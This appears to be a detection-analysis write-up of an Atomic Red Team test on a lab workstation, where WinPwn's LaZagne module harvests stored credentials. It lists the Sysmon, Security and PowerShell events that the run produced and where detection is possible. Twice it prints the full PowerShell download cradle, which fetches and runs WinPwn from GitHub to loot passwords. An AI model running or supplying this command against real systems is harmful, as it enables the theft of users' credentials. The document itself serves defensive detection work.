# T1555-6: Credentials from Password Stores — WinPwn: Loot Local Credentials via LaZagne

## Technique Context

T1555 covers credential theft from password stores. This test uses the WinPwn PowerShell post-exploitation framework (authored by S3cur3Th1sSh1t, available on GitHub) to run its `lazagnemodule` function, which wraps the LaZagne credential harvesting tool. LaZagne is a well-known open-source credential recovery utility that extracts passwords from a wide range of sources: browsers, email clients, databases, Wi-Fi profiles, the Windows Credential Manager, Windows Vault, and numerous third-party applications. WinPwn serves as a delivery wrapper — it pulls the framework from GitHub at runtime and orchestrates specific modules without requiring any tools to be pre-staged on disk.

The full WinPwn framework is downloaded at execution time via `iex(new-object net.webclient).downloadstring(...)`, making this another memory-only execution approach. The ART test invokes `lazagnemodule -consoleoutput -noninteractive` to run LaZagne in non-interactive mode and return results to the console.

This ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 171 total events: 42 Sysmon events, 125 PowerShell operational events, and 4 Security events.

**Sysmon EID 1 (Process Create)** captures the attack execution:

```
CommandLine: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive}
CurrentDirectory: C:\Windows\TEMP\
User: NT AUTHORITY\SYSTEM
IntegrityLevel: System
```

The command line uses `new-object net.webclient` with `.downloadstring()` — a classic PowerShell download cradle. The WinPwn URL includes a specific commit hash (`121dcee2...`), and the function call follows immediately in the same script block. The execution runs as `NT AUTHORITY\SYSTEM` from `C:\Windows\TEMP\`.

The ART test framework `whoami.exe` check appears as a second Sysmon EID 1.

**Sysmon EID 7 (Image Load)** captures 25 DLL load events. **EID 10 (Process Access)** captures 4 events at `GrantedAccess: 0x1FFFFF`. **EID 11 (File Create)** captures 4 events (more than the 2-3 seen in T1555-2/3, potentially from LaZagne's temporary file operations). **EID 17 (Pipe Create)** captures 3 events.

The eid_breakdown confirms 1 EID 22 (DNS Query) and 1 EID 3 (Network Connection) — the WinPwn download — are recorded outside the sample window.

**Security EID 4688** captures four process creation events. The attack command line is recorded:

```
Process Command Line: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive}
```

**PowerShell EID 4104** captures 120 script block events, with EID 4103 capturing 4 module pipeline events and 1 EID 4100 error event.

## What This Dataset Does Not Contain

**No Security EID 5379/5381 credential access events.** LaZagne accesses the Windows Credential Manager through its own internal mechanism — likely direct Windows API calls or file-based access to `%LOCALAPPDATA%\Microsoft\Credentials` — rather than via the `CredEnumerate` path that `vaultcmd.exe` uses. As with T1555-2/3, the dedicated credential access audit event is absent.

**No LaZagne binary execution events.** WinPwn's `lazagnemodule` likely executes LaZagne as a compiled Python executable or runs it through embedded code. If a `lazagne.exe` process was spawned, its EID 1 event is not in the sampled events. The absence of obvious child processes (beyond `whoami.exe`) in the sample suggests LaZagne may execute within the PowerShell process itself or via a process not captured in the 20-event sample window.

**The WinPwn script body is not in sampled script block logs.** The 125 PowerShell events include the in-memory loaded WinPwn framework in non-sampled EID 4104 events, which would contain the `lazagnemodule` function implementation.

**Credential output.** LaZagne's findings — any credentials it recovered from browsers, the Credential Manager, or other sources — are not recorded in any Windows event log channel.

## Assessment

With Defender disabled, WinPwn's `lazagnemodule` executes and runs LaZagne against the full set of credential sources on ACME-WS06. The dataset clearly captures the delivery mechanism. Compared to the defended variant (37 Sysmon, 51 PowerShell, 11 Security), the undefended dataset shows the test framework running to completion (125 PowerShell vs 51), confirming LaZagne executed past Defender's interruption point.

The 4 EID 11 (File Create) events in this dataset versus 2-3 in the T1555-2/3 datasets may reflect LaZagne writing temporary files during its credential scanning operations.

The WinPwn framework consolidates multiple credential theft techniques behind a single PowerShell invocation. The `lazagnemodule` function makes this the broadest-scope credential harvesting test in this batch — LaZagne targets not just the Credential Manager but every credential store it knows about. The detection footprint, however, is captured at the delivery layer (the download cradle and function name) rather than the individual credential access operations.

## Detection Opportunities Present in This Data

**Sysmon EID 1** captures the full download cradle command line: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...')`. The combination of `new-object net.webclient` with `.downloadstring` and `iex` is a widely recognized malicious PowerShell pattern. The function name `lazagnemodule` is also directly present.

**Security EID 4688** records the identical command line via the Security channel.

**Sysmon EID 3 and EID 22** (confirmed in eid_breakdown) capture the outbound TCP connection from the SYSTEM-context PowerShell process to GitHub's raw content delivery (`raw.githubusercontent.com`, resolving to `185.199.x.x` range). This network connection is a prerequisite for the attack and would be visible before any credential access occurs.

**PowerShell EID 4104** would contain the `lazagnemodule` function body from WinPwn, including the LaZagne invocation code. The term `WinPwn` or `lazagne` in script block content is a high-confidence indicator.

The use of `net.webclient` versus `Invoke-WebRequest` (`iwr`) is a stylistic distinction between T1555-6/7/8/11 (WinPwn tests, all using `net.webclient`) and T1555-2/3 (which use `IWR`). Both are equivalent download cradles but this distinction may be relevant for pattern matching against known tooling.
